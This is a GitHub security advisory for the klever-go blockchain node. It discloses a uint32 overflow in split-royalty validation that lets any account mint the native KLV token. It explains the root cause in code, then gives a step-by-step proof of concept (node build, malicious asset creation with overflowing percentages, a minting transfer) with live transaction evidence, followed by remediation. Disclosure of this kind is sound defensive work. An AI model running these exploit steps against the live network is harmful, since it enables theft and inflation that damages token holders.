# [C] Klever: Integer overflow in split-royalty validation enables unbounded minting of KLV (native token)

## Summary
Severity: Critical
Advisory: GHSA-cgc5-v3f2-8m2v
CVE: CVE-2026-54755
CWE: CWE-190
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-cgc5-v3f2-8m2v
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0 <1.7.19

## Details
## Summary

The per-entry percentages of a KDA asset's **split royalties** are validated by summing
them into a **`uint32`** accumulator and checking the *sum* against `HundredPercent (10000)`,
with **no upper bound on each individual entry**. Two split entries whose percentages sum to
just over `2^32` **wrap around** below `10000` and pass validation, while each stored value
remains astronomically large (e.g. `0x80000000 = 2,147,483,648` ≈ 21,474,836%).

At royalty payout, each split recipient is credited `pool × hugePct / 10000` — far more than
the royalty pool — and the resulting negative remainder is silently discarded
(`if royaltiesToPay <= 0 { return Ok }`). Because **fixed** royalties (and marketplace/ITO
royalties) are denominated in **KLV**, an attacker mints **KLV (the native token)** out of thin
air, on demand, by transferring or selling their own throwaway asset.

This is independent of, and not mitigated by, the existing `FixMarketBuyOverflow` guard.


## Affected component

- Repository: `klever-io/klever-go` (node).
- Validation: `core/process/kda/assetHelper.go`, `core/kapp/kda/create.go`,
  `core/kapp/kda/trigger.go`, `core/kapp/builtInFunctions/utils.go`.
- Payout (mint sites): `core/kapp/accounts/accounts.go` (transfer), `core/kapp/market/market.go`
  (marketplace buy), `core/kapp/ito/ito.go` (ITO buy).
- **Not** gated by any fork flag — exploitable on current mainnet.

---

## Root cause

### 1. Per-entry split percentages are decoded as raw `uint32` with no bound
`core/kapp/builtInFunctions/utils.go` — `decodeSplitInfo` (≈L292):
```go
func decodeSplitInfo(buf *bytes.Reader, splitInfo *transaction.RoyaltySplitInfo) error {
	fields := []*uint32{
		&splitInfo.PercentTransferPercentage,
		&splitInfo.PercentTransferFixed,
		&splitInfo.PercentMarketPercentage,
		&splitInfo.PercentMarketFixed,
		&splitInfo.PercentITOPercentage,
		&splitInfo.PercentITOFixed,
	}
	for _, field := range fields {
		if err := binary.Read(buf, binary.BigEndian, field); err != nil { // no <= HundredPercent check
			return err
		}
	}
	return nil
}
```

### 2. Validation sums into a `uint32` and only checks the sum
`core/kapp/kda/create.go` (fungible path, ≈L351-382; NFT path ≈L228-264):
```go
sumSplitTransferPercentage := uint32(0)   // L351  <-- uint32 accumulator
sumSplitTransferFixed       := uint32(0)
// ...
for key, value := range tc.GetRoyalties().GetSplitRoyalties() {
	// ... no per-entry bound ...
	sumSplitTransferPercentage += value.GetPercentTransferPercentage() // can overflow uint32
	sumSplitTransferFixed       += value.GetPercentTransferFixed()
	// ...
}
if !kda.CheckValid100Params(sumSplitTransferPercentage, sumSplitTransferFixed, /*...*/) { // sees the WRAPPED sum
	return transaction.Transaction_ParameterInvalid, common.ErrInvalidValue
}
```
`core/process/kda/assetHelper.go` (L101):
```go
func CheckValid100Params(values ...uint32) bool {
	for _, value := range values {
		if value > core.HundredPercent { // HundredPercent = 10000
			return false
		}
	}
	return true
}
```
The per-entry `> HundredPercent` check that exists for `TransferPercentage` **tiers**
(`create.go:398`, `trigger.go:780`) does **not** apply to these `SplitRoyalties` fields.

`0x80000000 + 0x80000000 = 0x1_0000_0000` → **wraps to `0`** in `uint32` → `CheckValid100Params(0)` is true.

### 3. Payout over-pays and silently drops the negative remainder (mint), in KLV
`core/kapp/accounts/accounts.go` — `processFixedRoyaltiesTransfer` (L316-382):
```go
err := acntSrc.SubFromBalance(kda.Royalties.TransferFixed, kdautils.KLVIdentifier, ...) // L332: sender pays a tiny KLV fixed royalty
// ...
royaltiesFixedToPay := kda.Royalties.TransferFixed
for key, value := range kda.Royalties.SplitRoyalties {
	// L343: split paid in KLV using the overflowed PercentTransferFixed
	status, err := a.computeSplitRoyalties(key, kdautils.KLVIdentifier, kapps.KDAData_Fungible,
		acntSrc, kda.Royalties.TransferFixed, int64(value.PercentTransferFixed), &royaltiesFixedToPay)
	// ...
}
if royaltiesFixedToPay <= 0 {   // L349: negative remainder silently dropped (no error)
	return transaction.Transaction_Ok, nil
}
```
`computeSplitRoyalties` (L276-314):
```go
splitToPay, err := tools.ComputePercentageI64(value, percentage, a.forkController.EnableSmartContracts()) // L287
*royaltiesToPay -= splitToPay                                                                              // L291
err = splitRoyalty.AddToBalance(splitToPay, assetID, ...)                                                  // L293: credit, no matching debit
```
`tools/converters.go` — `ComputePercentageI64` (L102): for a small `pool`, `pool * 0x80000000 / 10000`
fits in `int64`, so **no overflow error fires** — it simply returns the inflated amount.

**Net:** sender debited `TransferFixed` KLV (e.g. 1 KLV); each split recipient credited
`TransferFixed × 0x80000000 / 10000` KLV. KLV minted = (sum of split credits) − `TransferFixed`.

The same pattern exists in `core/kapp/market/market.go` (`computeRoyaltiesAmount` L490+ in the
sale `currencyID`; `computeRoyaltiesFixedDeposit` L443+ in KLV — silent skips at L456/L503) and
`core/kapp/ito/ito.go` (L429/L499). The shipped `FixMarketBuyOverflow` guard only checks the
top-level `marketOwnerAmount < 0`, not these intra-royalty split over-payments.

---

## Proof of Concept (reproduce from scratch)

A single-node local network is sufficient. Full environment setup is in the companion runbook
`REPRODUCE-split-royalty-overflow.md`; the exploit itself is two transactions.

### Prereqs (build + run a single node)
```bash
export REPO=/path/to/klever-go && cd "$REPO"
go build -o /tmp/klnode ./cmd/node
go build -o /tmp/kloperator ./cmd/operator
go build -o /tmp/klkeygen ./cmd/keygenerator
# Generate a validator key, point config/node/nodesSetup.json + genesis.json at it and at a
# funded wallet (klvDenomination 6), then:
nohup /tmp/klnode --config=./config/node/config.yaml --genesis-file=./config/node/genesis.json \
  --nodes-setup-file=./config/node/nodesSetup.json --validator-key-pem-file=./config/node/validatorKey.pem \
  --rest-api-interface=127.0.0.1:8080 --working-directory=/tmp/klnet-db --log-level='*:INFO' \
  > /tmp/klnode.log 2>&1 < /dev/null & disown
```

### Step 1 — create a malicious asset (your own throwaway token)
The operator stores percentages as `uint32(input × 100)`, so `21474836.48 → 2147483648 = 0x80000000`.
Two entries make the `uint32` sum wrap to 0.
```bash
R1=<any valid klv1 address>   # clean recipient, will receive minted KLV
R2=<any valid klv1 address>   # second recipient
/tmp/kloperator kda create 0 \
  --name="KlvPrinter" --ticker=KPRT2 --precision=6 --initialSupply=1000000 --canMint \
  --royaltiesAddress=<owner> \
  --royaltiesTransferFixed=1 \
  --splitRoyalties="{\"address\":\"$R1\",\"percentTransferFixed\":21474836.48}" \
  --splitRoyalties="{\"address\":\"$R2\",\"percentTransferFixed\":21474836.48}" \
  -s --await
```
**Expected:** `resultCode: Ok`. The node stores `percentTransferFixed: 2147483648` for both
recipients (a correct chain would reject this).

### Step 2 — mint KLV with one ordinary transfer
```bash
/tmp/kloperator account send "$R2" 1 --kda KPRT2-<id> -s --await
```
**Expected:** `resultCode: Ok`, with two **KLV** transfer receipts of `214748364800`
(= 214,748.36 KLV) to R1 and R2 — for a `TransferFixed` royalty of `1000000` (1 KLV).

### Verify the mint
```bash
# R1 KLV balance went from 0 to 214,748.36 although nobody sent it KLV:
curl -s "http://127.0.0.1:8080/address/$R1" | python3 -c \
 "import sys,json;print(json.load(sys.stdin)['data']['account']['Balance']/1e6,'KLV')"
```

---

## Evidence (live single-node run, chainID 420420)

### Asset creation — overflowed split royalties **accepted** (`resultCode: Ok`)
tx `1e288135d138be61a1fc240775eed04fcb578cc7299b28bea9e47c79f86e60eb`, broadcast contract
(operator output, abridged):
```json
{
  "type": 0, "name": "KlvPrinter2", "ticker": "KPRT2",
  "ownerAddress": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
  "initialSupply": 1000000000000,
  "royalties": {
    "address": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
    "transferFixed": 1000000,
    "splitRoyalties": {
      "klv17e8zzgn73h6ehe3c6q9vlt77kuxk5euddmhymy5uhv2rhv0dc0nqlfp0ap": { "percentTransferFixed": 2147483648 },
      "klv1fpwjz234gy8aaae3gx0e8q9f52vymzzn3z5q0s5h60pvktzx0n0qwvtux5": { "percentTransferFixed": 2147483648 }
    }
  }
}
```
Result: `hash: 1e288135…`, `status: success`, `resultCode: Ok`.
(`2147483648 = 0x80000000`; the two values' `uint32` sum is `0` → passed `CheckValid100Params`.)

### Transfer — mints KLV (`resultCode: Ok`)
tx `4e869e93f480c7735f08d6f807cd3c0bb1935131d9bacef75ca7e3402501d1e6`, block `375`,
`status: success`, `resultCode: Ok`. Receipts (operator output):
```json
{"typeString": "SignedBy"}
{"typeString": "Transfer", "from": "klv1ddnn…(owner)", "to": "klv1fpwjz…(R1)", "value": 214748364800, "assetId": "KLV",        "assetType": "Fungible"}
{"typeString": "Transfer", "from": "klv1ddnn…(owner)", "to": "klv17e8zz…(R2)", "value": 214748364800, "assetId": "KLV",        "assetType": "Fungible"}
{"typeString": "Transfer", "from": "klv1ddnn…(owner)", "to": "klv17e8zz…(R2)", "value": 1000000,       "assetId": "KPRT2-2712", "assetType": "Fungible"}
```

**Outcome:** the sender paid `1000000` (1 KLV) of fixed royalty; the two split recipients were
each credited `214748364800` (**214,748.36 KLV**) — **429,496.73 KLV minted** from a 1 KLV royalty,
in a single transfer. `R1` went from a non-existent/0-KLV account to **214,748.36 KLV** while never
being sent any KLV. The minted amount is `pool(=1000000) × 0x80000000 / 10000 = 214748364800` per
recipient.

A prior run reproduced the same on the *transfer-percentage* path, minting the asset itself
(42,949,672.96 tokens from one transfer); note that the asset's booked `CirculatingSupply` /
`MintedValue` **do not change** (the mint is via direct `AddToBalance`, not a tracked `Mint`), so
the inflation is invisible to supply dashboards and only detectable by summing balances.

---

## Impact

- **Unbounded inflation of KLV (the native token)**, repeatable per transaction for only tx fees.
- Same root cause also mints KLV via **marketplace buy** (sale currency + KLV `MarketFixed`
  deposit) and **ITO buy**, and mints arbitrary assets via the transfer-percentage path.
- The mint is **off the books** (booked supply unchanged), making detection hard.
- Total loss of economic integrity for all token/KLV holders.

## Who can exploit it / prerequisites

- **Any account** that can pay the one-time asset-creation fee + tx fees. No roles, admin, or
  allowlist.
- **Any client.** The `operator` CLI used above is unprivileged: it signs a standard transaction
  and POSTs to the public, unauthenticated `/transaction/send` endpoint
  (`network/api/transaction/routes.go`, `SendTX`/`BroadcastTX` — no auth). The official SDKs or a
  hand-signed `curl` produce identical results; nothing in the operator is required.
- Deterministic, single-transaction trigger after a one-time asset setup.

---

## Remediation

Two layers, both should ship. Because these change transaction-validity/consensus behavior, gate
them behind a new activation-epoch fork flag (same mechanism as the existing `FixMarketBuyOverflow`),
so historical blocks reprocess identically.

### A. Reject over-100% split percentages at validation (root cause)
1. Bound **each individual** split field, e.g. in `decodeSplitInfo`
   (`core/kapp/builtInFunctions/utils.go`):
   ```go
   for _, field := range fields {
       if err := binary.Read(buf, binary.BigEndian, field); err != nil { return err }
       if *field > core.HundredPercent { return process.ErrInvalidRoyalties } // NEW
   }
   ```
2. Accumulate sums in `uint64` (overflow-proof) in `core/kapp/kda/create.go` and
   `core/kapp/kda/trigger.go`, and reject if any per-category sum `> core.HundredPercent`.
   (With each entry ≤ 10000 and the existing `MaxTransferRoyalties = 20` cap, the max sum is
   200000 — but use `uint64` regardless for defense in depth.)

### B. Treat a negative royalty remainder as a hard error (defense in depth)
In every split-distribution site, replace the silent skip with a rejection:
```go
// BEFORE
if royaltiesToPay <= 0 { return transaction.Transaction_Ok, nil }
// AFTER
if royaltiesToPay < 0  { return transaction.Transaction_ParameterInvalid, common.ErrInvalidValue }
if royaltiesToPay == 0 { return transaction.Transaction_Ok, nil }
```
Sites: `core/kapp/accounts/accounts.go` (L349 fixed, L436 percentage),
`core/kapp/market/market.go` (L456, L503), `core/kapp/ito/ito.go` (L429, L499).

### C. (Optional) Assert conservation
After distributing a royalty pool, assert `Σ splitToPay == pool` (the owner gets the exact
remainder), so any future regression aborts the tx instead of minting.

A regression test should: (1) confirm an asset whose split percentages sum-overflow `uint32` is
rejected at create/trigger, and (2) confirm a transfer/buy of such an asset (if one slipped in)
cannot pay out more than the royalty pool.

---

## Variants / notes

- **Transfer (percentage)** → mints the transferred asset. **Transfer (fixed)**, **Market**
  (fixed + percentage), **ITO** (fixed + percentage) → mint **KLV** / the sale currency.
- Smart-contract *senders* skip royalties, but a contract can *plant* the malicious royalties via
  `AssetTrigger/UpdateRoyalties` and let a normal account trigger the mint — atomically within one tx.
- The legacy `ComputePercentageI64` float path (`checkOverflow=false`) makes the over-pay even
  easier (no `int64` overflow guard at all), but the `big.Int` path mints too for small pools.

## References

- Vulnerable code: `core/process/kda/assetHelper.go:101`,
  `core/kapp/builtInFunctions/utils.go:292`, `core/kapp/kda/create.go:228-264,351-382`,
  `core/kapp/kda/trigger.go`, `core/kapp/accounts/accounts.go:276-382`,
  `core/kapp/market/market.go:443-538`, `core/kapp/ito/ito.go:415-556`,
  `tools/converters.go:102`.

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-cgc5-v3f2-8m2v
- https://github.com/klever-io/klever-go/commit/8bcc600b0ac88070740c63c7ce1c8a968dd85251
- https://github.com/klever-io/klever-go
- https://github.com/klever-io/klever-go/releases/tag/v1.7.19
